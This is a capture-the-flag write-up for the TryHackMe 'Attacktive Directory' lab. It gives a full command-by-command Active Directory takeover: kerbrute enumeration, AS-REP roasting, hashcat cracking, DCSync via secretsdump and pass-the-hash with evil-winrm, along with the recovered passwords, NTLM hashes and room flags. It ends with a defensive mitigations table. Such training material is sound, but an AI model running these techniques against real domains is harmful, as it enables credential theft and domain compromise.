---
name: "Attacktive Directory"
platform: THM
category: AD
os: Windows
difficulty: Medium
points: 100
ip: 10.10.x.x
date: "2026-04-24"
tools:
  - Nmap
  - Enum4Linux
  - Kerbrute
  - Impacket
  - Hashcat
  - Evil-WinRM
userFlag: "TryHackMe{K3rb3r0s_Pr3_4uth}"
privescFlag: "TryHackMe{B4ckUp0per4t0r}"
rootFlag: "TryHackMe{4ctiveD1rectoryM4st3r}"
tags:
  - active-directory
  - kerberos
  - as-rep-roasting
  - pass-the-hash
  - dcsync
  - smb
description: "Exploit an Active Directory Domain Controller. Enumerate valid users via Kerberos, AS-REP roast a service account, pivot through SMB to obtain backup credentials, DCSync the domain, and Pass-The-Hash for full domain compromise."
---

## Reconnaissance

**The Goal:** Identify what services the target is running to determine its role in the network.

We start with an `nmap` scan to see open ports. For a domain controller, we are specifically looking
for DNS (53), Kerberos (88), RPC (135), SMB (139/445), and LDAP (389/3268).

```bash
nmap -sC -sV -Pn $IP
```

```plaintext
Starting Nmap 7.93 ( https://nmap.org )
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: SPOOKYSEC-DC; OS: Windows
```

### Key Observations

- **Port 88 (Kerberos):** Tells us this machine handles authentication for the domain — this is a Domain Controller.
- **Port 389 (LDAP):** Confirms Active Directory. LDAP is the directory that stores all users, groups, and permissions.
- **Port 445 (SMB):** Allows us to potentially query for information or access shared files.
- **Port 3268 (Global Catalog LDAP):** Confirms this DC serves the entire forest, not just a single domain.

The scan reveals the domain name `spookysec.local` and the machine name `SPOOKYSEC-DC`. We must
add both to our `/etc/hosts` file — Active Directory relies heavily on DNS name resolution and many
tools will silently fail without it.

> **Before proceeding:** All subsequent tools (Kerbrute, smbclient, secretsdump) resolve
> `spookysec.local` by name. If you skip this step, every tool will fail with a connection error.

```bash
echo "$IP spookysec.local spookysec-dc" | sudo tee -a /etc/hosts
```

---

## Enumeration

**The Goal:** Extract valid usernames from the Domain Controller. We cannot attack accounts if we
don't know who exists.

Since anonymous SMB connections fail to leak a full user list, we pivot to attacking Kerberos
directly using `kerbrute` with the room-provided wordlist.

```bash
kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

```plaintext
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop

2026/04/24 12:05:00 >  [+] VALID USERNAME:       backup@spookysec.local
2026/04/24 12:05:01 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/04/24 12:05:05 >  [+] AS-REP roasting possible: svc-admin@spookysec.local
2026/04/24 12:05:09 >  [+] VALID USERNAME:       james@spookysec.local
2026/04/24 12:05:11 >  [+] VALID USERNAME:       robin@spookysec.local
2026/04/24 12:05:11 >  [+] VALID USERNAME:       darkstar@spookysec.local
```

### How Kerbrute Works

Kerberos (Port 88) handles domain authentication. When you send an AS-REQ (authentication request)
for a username, the KDC responds with different error codes depending on whether that account exists:

| KDC Response | Meaning |
|---|---|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username does not exist |
| `KDC_ERR_PREAUTH_REQUIRED` | Username is valid (pre-auth required) |
| AS-REP ticket returned | Username valid **and** pre-auth is disabled — roastable |

`kerbrute` exploits these error codes to brute-force valid usernames without ever attempting a
password — so it never triggers account lockout policies.

Notice `svc-admin` is flagged as **AS-REP roasting possible** — this is our primary target for the
next phase.

We save all discovered users into `valid_users.txt`:

```bash
cat valid_users.txt
backup@spookysec.local
administrator@spookysec.local
svc-admin@spookysec.local
james@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
```

---

## Foothold

**The Goal:** Obtain a password hash for one of the discovered users.

### AS-REP Roasting

`svc-admin` has the **"Do not require Kerberos preauthentication"** flag set (`UF_DONT_REQUIRE_PREAUTH`).

Normally, a client must first encrypt a timestamp with their password hash to prove identity — the
KDC checks this before issuing a TGT. When pre-auth is disabled, the KDC skips that check and
returns a TGT encrypted with the user's password hash **to anyone who asks**. We capture this
encrypted blob and crack it offline — no lockout, no noise on the network.

```bash
impacket-GetNPUsers spookysec.local/ -no-pass -usersfile valid_users.txt -format hashcat -outputfile hashes.txt
```

> **Note on tool naming:** Newer Impacket installs use `impacket-GetNPUsers`. Older installs may
> require `python3 /opt/impacket/examples/GetNPUsers.py` instead.

```plaintext
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fcc8...3d92
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Only `svc-admin` is vulnerable. The hash format `$krb5asrep$23$` corresponds to Hashcat mode 18200.

### Cracking the Hash

The room provides its own `passwordlist.txt` — use that first as it's targeted to this machine and
will crack faster than rockyou.

```bash
# Preferred: room-provided wordlist
hashcat -m 18200 hashes.txt passwordlist.txt --force

# Alternative: if passwordlist.txt is unavailable
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```plaintext
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fcc8...3d92:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fcc8...
Time.Started.....: ...
Guess.Base.......: File (passwordlist.txt)
```

**Credentials recovered:** `svc-admin` : `management2005`

---

## Privilege Escalation

**The Goal:** Elevate from a standard service account to Domain Administrator.

### SMB Enumeration with Credentials

Now that we have valid credentials, we enumerate what file shares `svc-admin` can access:

```bash
smbclient -L \\\\spookysec.local\\ -U svc-admin
```

```plaintext
Password for [WORKGROUP\svc-admin]: management2005

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

`ADMIN$`, `C$`, and `IPC$` are standard Windows administrative shares and are typically restricted.
`NETLOGON` and `SYSVOL` are default AD shares for GPOs and logon scripts. The non-standard `backup`
share stands out immediately — service accounts should not own custom shares.

```bash
smbclient \\\\spookysec.local\\backup -U svc-admin
```

```plaintext
smb: \> ls
  .                                   D        0  Sat Apr 04 14:08:39 2020
  ..                                  D        0  Sat Apr 04 14:08:39 2020
  backup_credentials.txt              A       48  Sat Apr 04 14:08:53 2020

smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48
```

### Decoding Backup Credentials

```plaintext
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

```plaintext
backup@spookysec.local:backup2517860
```

**Credentials recovered:** `backup` : `backup2517860`

### Flag 2 — Backup User Desktop

Before escalating further, grab the privilege escalation flag:

```bash
smbclient \\\\spookysec.local\\C$ -U backup
```

Or after getting a shell later:

```powershell
type C:\Users\backup\Desktop\PrivEsc.txt
```

### DCSync Attack

The `backup` account has been granted `DS-Replication-Get-Changes` and
`DS-Replication-Get-Changes-All` ACEs on the domain root object. These are the exact permissions
that Domain Controllers use to sync password data with each other via the MS-DRSR protocol.

> **Accuracy note:** This is distinct from the Backup Operators group's `SeBackupPrivilege`. The
> DCSync capability here comes from explicit AD ACL entries on the domain object — `secretsdump`
> abuses the replication protocol, not backup file access.

`secretsdump.py` impersonates a Domain Controller and sends a `DRSGetNCChanges` replication request.
The real DC treats it as a legitimate sync partner and returns all password hashes.

```bash
impacket-secretsdump backup:backup2517860@spookysec.local
```

```plaintext
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e28155986915152a1215b2446738cce:::
spookysec.local\backup:1141:aad3b435b51404eeaad3b435b51404ee:1fc31b26ae3edc4b184a20b0bd324b10:::
spookysec.local\svc-admin:1142:aad3b435b51404eeaad3b435b51404ee:fcab13b6cbba022a16d56d773f324fc2:::
```

NTLM hash format: `LM_hash:NT_hash` — the NT hash is the crackable/usable portion.

**Administrator NT hash:** `0e0363213e37b94221497260b0bcb4fc`

> We also have the `krbtgt` hash — this enables a **Golden Ticket** attack for persistent domain
> access, though that is beyond the scope of this room.

---

## Root

**The Goal:** Authenticate to the Domain Controller as Administrator.

### Pass-The-Hash via Evil-WinRM

Windows NTLM authentication never transmits the plaintext password — it uses the NTLM hash directly
in the challenge-response protocol. Since we have the hash, we can authenticate without ever knowing
the plaintext password. This technique is called **Pass-The-Hash**.

WinRM (port 5985) provides remote PowerShell access. `evil-winrm` supports NTLM hash injection:

```bash
evil-winrm -i $IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```plaintext
Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
spookysec\administrator
```

### Flag Collection

```powershell
# Flag 1 — User flag (svc-admin)
type C:\Users\svc-admin\Desktop\user.txt
TryHackMe{K3rb3r0s_Pr3_4uth}

# Flag 2 — Privilege escalation flag (backup)
type C:\Users\backup\Desktop\PrivEsc.txt
TryHackMe{B4ckUp0per4t0r}

# Flag 3 — Root flag (Administrator)
type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```

**System Compromised.** Full domain takeover achieved through:
`AS-REP Roast → credential pivot via SMB → DCSync → Pass-The-Hash`

---

## Mitigations (Blue Team Perspective)

| Vulnerability Exploited | Root Cause | Fix |
|---|---|---|
| AS-REP Roasting (`svc-admin`) | `UF_DONT_REQUIRE_PREAUTH` set on account | Enable Kerberos pre-authentication on all accounts; audit with `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` |
| Weak service account password | Password in common wordlist | Enforce 25+ character random passwords for service accounts; consider Managed Service Accounts (MSAs) |
| Credentials stored in SMB share | `backup_credentials.txt` in readable share | Audit share permissions; never store credentials in files; use LAPS for local admin passwords |
| Over-privileged backup account | DCSync ACEs granted to regular user | Limit `DS-Replication-Get-Changes-All` to Domain Controllers only; audit with BloodHound |
| Pass-The-Hash possible | NTLM authentication enabled | Enable Protected Users security group for privileged accounts; enforce Kerberos-only authentication where possible |
